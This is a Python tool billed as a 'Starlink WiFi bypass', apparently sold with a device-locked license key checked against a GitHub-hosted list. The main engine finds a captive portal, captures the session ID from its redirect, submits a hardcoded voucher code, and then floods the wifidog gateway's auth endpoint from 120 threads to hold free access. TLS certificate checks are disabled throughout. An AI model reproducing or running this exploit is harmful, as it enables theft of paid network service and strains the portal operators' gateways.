#!/usr/bin/env python

import requests, re, urllib3, time, threading, os, random, hashlib, platform, ssl, json
import subprocess
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

# ========== COLOR SCHEME ==========
class Colors:
    RESET = "\033[0m"
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN = "\033[36m"
    WHITE = "\033[37m"
    BOLD = "\033[1m"
    DIM = "\033[2m"

bred = Colors.RED
bgreen = Colors.GREEN
bblue = Colors.BLUE
bcyan = Colors.CYAN
bmagenta = Colors.MAGENTA
byellow = Colors.YELLOW
bwhite = Colors.WHITE
bbold = Colors.BOLD
bdim = Colors.DIM
reset = Colors.RESET

# ========== SSL & WARNING BYPASS ==========
try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    pass
else:
    ssl._create_default_https_context = _create_unverified_https_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========== CONFIGURATION ==========
KEY_URL = "https://raw.githubusercontent.com/ahlflk/AHLFLK_WiFi_Bypass/refs/heads/main/key.txt"
LICENSE_FILE = ".ahlflk_data.lic"

# ========== DEVICE ID (HWID) SYSTEM ==========
def get_hwid():
    ID_STORAGE = ".device_id"
    if os.path.exists(ID_STORAGE):
        with open(ID_STORAGE, "r") as f:
            return f.read().strip()
    try:
        serial = subprocess.check_output("getprop ro.serialno", shell=True).decode().strip()
        if not serial or serial == "unknown" or "012345" in serial:
            serial = subprocess.check_output("settings get secure android_id", shell=True).decode().strip()
        if not serial:
            import uuid
            serial = str(uuid.getnode())
        raw_hash = hashlib.md5(serial.encode()).hexdigest()[:10].upper()
        new_id = f"AHLFLK-{raw_hash}"
    except:
        new_id = f"AHLFLK-{hashlib.md5(str(os.getlogin()).encode()).hexdigest()[:10].upper()}"
    with open(ID_STORAGE, "w") as f:
        f.write(new_id)
    return new_id

# ========== LICENSE SAVE/LOAD ==========
def save_license(hwid, key, expiry):
    data = {"id": hwid, "key": key, "expiry": expiry}
    with open(LICENSE_FILE, "w") as f:
        json.dump(data, f)

def load_license():
    if os.path.exists(LICENSE_FILE):
        try:
            with open(LICENSE_FILE, "r") as f:
                return json.load(f)
        except:
            return None
    return None

def delete_license():
    if os.path.exists(LICENSE_FILE):
        os.remove(LICENSE_FILE)
        return True
    return False

# ========== BANNER ==========
def banner():
    os.system('clear')
    print(f"{bred}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓{reset}")
    print(f"{bred}┃{reset}                                                {bred}┃{reset}")
    print(f"{bred}┃{bgreen}      ⣠⣴⣶⣿⣿⠿⣷⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣷⠿⣿⣿⣶⣦⣀⠀⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen} ⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣶⣦⣬⡉⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⢉⣥⣴⣾⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen} ⠀⠀⠀⡾⠿⠛⠛⠛⠛⠿⢿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⣿⣿⠿⠿⠛⠛⠛⠛⠿⢧⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⣠⣤⠶⠶⠶⠰⠦⣤⣀⠀⠙⣷⠀⠀⠀⠀⠀⠀⠀⢠⡿⠋⢀⣀⣤⢴⠆⠲⠶⠶⣤⣄⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen} ⠀⠘⣆⠀⠀⢠⣾⣫⣶⣾⣿⣿⣿⣿⣷⣯⣿⣦⠈⠃⡇⠀⠀⠀⠀⢸⠘⢁⣶⣿⣵⣾⣿⣿⣿⣿⣷⣦⣝⣷⡄⠀⠀⡰⠂⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen} ⠀⠀⣨⣷⣶⣿⣧⣛⣛⠿⠿⣿⢿⣿⣿⣛⣿⡿⠀⠀⡇⠀⠀⠀⠀⢸⠀⠈⢿⣟⣛⠿⢿⡿⢿⢿⢿⣛⣫⣼⡿⣶⣾⣅⡀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen} ⢀⡼⠋⠁⠀⠀⠈⠉⠛⠛⠻⠟⠸⠛⠋⠉⠁⠀⠀⢸⡇⠀⠀⠄⠀⢸⡄⠀⠀⠈⠉⠙⠛⠃⠻⠛⠛⠛⠉⠁⠀⠀⠈⠙⢧⡀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡇⢠⠀⠀⠀⢸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡇⠀⠀⠀⠀⢸⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⠁⣿⠇⠀⠀⠀⠀⢸⡇⠙⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen} ⠀⠰⣄⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⠖⡾⠁⠀⠀⣿⠀⠀⠀⠀⠀⠘⣿⠀⠀⠙⡇⢸⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠄⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen} ⠀⠀⢻⣷⡦⣤⣤⣤⡴⠶⠿⠛⠉⠁⠀⢳⠀⢠⡀⢿⣀⠀⠀⠀⠀⣠⡟⢀⣀⢠⠇⠀⠈⠙⠛⠷⠶⢦⣤⣤⣤⢴⣾⡏⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen}  ⠀⠈⣿⣧⠙⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⢊⣙⠛⠒⠒⢛⣋⡚⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡿⠁⣾⡿⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen}⠀ ⠀⠀⠘⣿⣇⠈⢿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⡿⢿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⠁⣼⡿⠁⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen}⠀⠀ ⠀⠀⠘⣿⣦⠀⠻⣿⣷⣦⣤⣤⣶⣶⣶⣿⣿⣿⣿⠏⠀⠀⠻⣿⣿⣿⣿⣶⣶⣶⣦⣤⣴⣿⣿⠏⢀⣼⡿⠁⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen}⠀⠀⠀ ⠀⠀⠘⢿⣷⣄⠙⠻⠿⠿⠿⠿⠿⢿⣿⣿⣿⣁⣀⣀⣀⣀⣙⣿⣿⣿⠿⠿⠿⠿⠿⠿⠟⠁⣠⣿⡿⠁⠀⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen}⠀⠀⠀⠀ ⠀⠀⠈⠻⣯⠙⢦⣀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⣠⠴⢋⣾⠟⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen}⠀⠀⠀⠀⠀ ⠀⠀⠀⠙⢧⡀⠈⠉⠒⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠐⠒⠉⠁⢀⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠈⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣠⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠘⢦⡀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{reset}                                                {bred}┃{reset}")
    print(f"{bred}┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫{reset}")
    print(f"{bred}┃{bcyan}      🔥 STARLINK WiFi BYPASS - IMMORTAL 🔥     {bred}┃{reset}")
    print(f"{bred}┃{byellow}      ✨ Error Contact 👉 @AHLFLK2025  ✨       {bred}┃{reset}")
    print(f"{bred}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{reset}")
    print()

# ========== LICENSE CHECK (WITH EXPIRY ENFORCEMENT) ==========
def check_license():
    hwid = get_hwid()
    banner()
    
    local_data = load_license()
    if local_data and local_data.get("id") == hwid:
        try:
            expiry_date = datetime.strptime(local_data["expiry"], "%d-%m-%Y")
            if datetime.now() < expiry_date:
                print(f"{bgreen}╔═══════════════════════════════════════════════════════╗{reset}")
                print(f"{bgreen}║  ✓ AUTO-LOGIN SUCCESS! (Offline Mode)                 ║{reset}")
                print(f"{bgreen}║  ✓ DEVICE ID: {hwid:<40}║{reset}")
                print(f"{bgreen}║  ✓ EXPIRY: {local_data['expiry']}                                 ║{reset}")
                print(f"{bgreen}╚═══════════════════════════════════════════════════════╝{reset}")
                time.sleep(2)
                return True
            else:
                print(f"{bred}╔════════════════════════════════════════════════════════════╗{reset}")
                print(f"{bred}║  ✗ LICENSE EXPIRED!                                       ║{reset}")
                print(f"{bred}║  ✗ Your key expired on: {local_data['expiry']}                          ║{reset}")
                print(f"{bred}║  ✗ Local license file has been deleted.                  ║{reset}")
                print(f"{bred}║  ✗ Please renew your key to continue.                    ║{reset}")
                print(f"{bred}╚════════════════════════════════════════════════════════════╝{reset}")
                delete_license() 
                time.sleep(3)
                return False
        except:
            delete_license()
            return False
    print(f"{bcyan}╔════════════════════════════════════════════════════════════╗{reset}")
    print(f"{bcyan}║  🔐 LICENSE VERIFICATION REQUIRED                          ║{reset}")
    print(f"{bcyan}╚════════════════════════════════════════════════════════════╝{reset}")
    print(f"{byellow}[*] YOUR DEVICE ID: {hwid}{reset}")
    input_key = input(f"{bgreen}[>] ENTER ACCESS KEY: {reset}").strip()
    
    print(f"{bdim}[*] Verifying license online...{reset}")
    try:
        response = requests.get(KEY_URL, timeout=10, verify=False).text
        lines = response.splitlines()
        
        for line in lines:
            if "|" in line:
                parts = line.split("|")
                if len(parts) == 3:
                    db_id, db_key, db_date = parts
                    if db_id.strip() == hwid and db_key.strip() == input_key:
                        expiry_date = datetime.strptime(db_date.strip(), "%d-%m-%Y")
                        if datetime.now() < expiry_date:
                            save_license(hwid, input_key, db_date.strip())
                            print(f"{bgreen}╔════════════════════════════════════════════════════════════╗{reset}")
                            print(f"{bgreen}║  ✓ ACCESS GRANTED!                                        ║{reset}")
                            print(f"{bgreen}║  ✓ EXPIRY DATE: {db_date}                                         ║{reset}")
                            print(f"{bgreen}║  ✓ License saved to {LICENSE_FILE}                    ║{reset}")
                            print(f"{bgreen}╚════════════════════════════════════════════════════════════╝{reset}")
                            time.sleep(2)
                            return True
                        else:
                            print(f"{bred}╔════════════════════════════════════════════════════════════╗{reset}")
                            print(f"{bred}║  ✗ KEY EXPIRED!                                           ║{reset}")
                            print(f"{bred}║  ✗ Your key expired on: {db_date}                                 ║{reset}")
                            print(f"{bred}║  ✗ Please contact administrator to renew.               ║{reset}")
                            print(f"{bred}╚════════════════════════════════════════════════════════════╝{reset}")
                            return False
        
        print(f"{bred}╔════════════════════════════════════════════════════════════╗{reset}")
        print(f"{bred}║  ✗ INVALID KEY OR DEVICE ID NOT REGISTERED                ║{reset}")
        print(f"{bred}╚════════════════════════════════════════════════════════════╝{reset}")
        return False
    except Exception as e:
        if local_data:
            try:
                expiry_date = datetime.strptime(local_data["expiry"], "%d-%m-%Y")
                if datetime.now() < expiry_date:
                    print(f"{byellow}╔════════════════════════════════════════════════════════════╗{reset}")
                    print(f"{byellow}║  ⚠ OFFLINE MODE - Using cached license                  ║{reset}")
                    print(f"{byellow}║  ✓ Expiry: {local_data['expiry']}                                              ║{reset}")
                    print(f"{byellow}╚════════════════════════════════════════════════════════════╝{reset}")
                    time.sleep(2)
                    return True
                else:
                    delete_license()
                    print(f"{bred}[!] Cached license expired. Please connect to internet to renew.{reset}")
                    return False
            except:
                return False
        else:
            print(f"{bred}[!] DATABASE ERROR: Please check your internet for first-time login.{reset}")
            return False

# ========== NETWORK CHECK ==========
def check_net():
    try:
        return requests.get("http://www.google.com/generate_204", timeout=3).status_code == 204
    except:
        return False

# ========== HIGH SPEED PULSE ==========
def high_speed_pulse(link):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache"
    }
    while True:
        try:
            requests.get(link, timeout=5, verify=False, headers=headers)
            print(f"{bgreen}[✓] AHLFLK Bypass | STABLE >>> [{random.randint(40,180)}ms]{reset}")
            time.sleep(0.01)
        except:
            time.sleep(1)
            break

# ========== MAIN BYPASS ENGINE ==========
def start_immortal():
    if not check_license():
        return

    print(f"{bcyan}[*] Initializing AHLFLK Bypass Engine...{reset}")
    time.sleep(1)
    
    while True:
        session = requests.Session()
        try:
            print(f"{bdim}[*] Scanning for captive portal...{reset}")
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
            
            p_url = r.url
            r1 = session.get(p_url, verify=False, timeout=5)
            match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            n_url = urljoin(p_url, match.group(1)) if match else p_url
            r2 = session.get(n_url, verify=False, timeout=5)
            
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            
            if sid:
                print(f"{bgreen}[✓] Session ID Captured: {sid[:20]}...{reset}")
                p_host = f"{urlparse(p_url).scheme}://{urlparse(p_url).netloc}"
                session.post(f"{p_host}/api/auth/voucher/", json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
                
                gw = parse_qs(urlparse(p_url).query).get('gw_address', ['192.168.60.1'])[0]
                port = parse_qs(urlparse(p_url).query).get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}"
                
                print(f"{byellow}[*] Launching 120 High-Speed Threads...{reset}")
                for _ in range(120):
                    threading.Thread(target=high_speed_pulse, args=(auth_link,), daemon=True).start()
                
                print(f"{bgreen}[✓] Bypass Active! Monitoring Connection...{reset}")
                
                while True:
                    if not check_net():
                        print(f"{bred}[!] Connection Lost! Re-injecting...{reset}")
                        break
                    time.sleep(5)
            else:
                print(f"{byellow}[!] No Session ID found. Retrying...{reset}")
                time.sleep(2)
        except Exception as e:
            print(f"{bred}[!] Error: {str(e)[:50]}... Retrying{reset}")
            time.sleep(2)

# ========== MAIN ==========
if __name__ == "__main__":
    try:
        start_immortal()
    except KeyboardInterrupt:
        print(f"\n{bred}[!] Script Stopped by User.{reset}")
